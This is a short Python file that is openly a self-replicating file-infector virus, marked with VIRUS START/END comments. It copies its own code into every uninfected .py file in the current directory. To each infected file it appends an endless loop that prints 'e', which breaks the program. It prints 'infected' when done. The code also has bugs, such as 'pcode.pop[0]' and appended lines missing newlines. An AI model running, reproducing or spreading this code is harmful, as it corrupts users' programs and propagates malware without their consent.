#### VIRUS START ####
from ssl import _PeerCertRetType
import sys, glob, re

# get a copy of the virus
vcode=[]
fh=open(sys.argv[0],"r")
lines=fh.readlines()
fh.close()
inVirus=False
for line in lines:
    if (re.search('^#### VIRUS START ####',line)): inVirus=True
    if (inVirus):
        vcode.append(line)
    if (re.search("^#### VIRUS END ####",line)):
        break
    
        
# find potential victims
ps=glob.glob("*.py")

#check and infect potential victims
for p in ps:
    fh=open(p,"r")
    pcode=fh.readlines()
    fh.close()
    infected=False
    for line in pcode:
        if ("#### VIRUS START ####" in line):
            infected=True
            break
    if not infected:
        newcode=[]
        if ("#!" in pcode[0]):
            newcode.append(pcode.pop[0])
        newcode.extend(vcode)
        newcode.extend(pcode)
        newcode.append("while True:")
        newcode.append("    print('e')")
        # writing new virus infected code
        fh=open(p,"w")
        fh.writelines(newcode)
        fh.close()

#optional acknowledgement

print("infected")

#### VIRUS END ####